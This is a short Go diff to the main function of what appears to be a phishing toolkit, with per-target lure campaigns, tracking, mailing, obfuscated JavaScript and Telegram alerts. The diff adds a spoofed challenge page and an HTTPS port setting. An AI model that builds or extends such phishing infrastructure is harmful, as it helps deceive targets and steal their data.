@@ -205,6 +205,7 @@ func main() {
 	eng.SetJS(obfuscate.Obfuscate)
 	eng.SetLimiter(ratelimit.New(120, time.Minute))
 	eng.SetChallenge(puppet.Reporter{Block: blocked, Bus: bus})
+	eng.SetChallengePage(spoof.Challenge)
 
 	// Кампании: per-target приманки + трекинг + рассылка (SMTP только env).
 	campStore := campaign.NewStore()
@@ -281,6 +282,7 @@ func main() {
 					"autocert":       cfg.TLS.Autocert != nil && *cfg.TLS.Autocert,
 					"telegram":       cfg.Notify.TelegramEnabled,
 					"session_ttl_min": cfg.Storage.SessionTTLMin,
+					"https_port": cfg.HTTPSPort,
 				}
 			},
 			PhishDir:    dir,
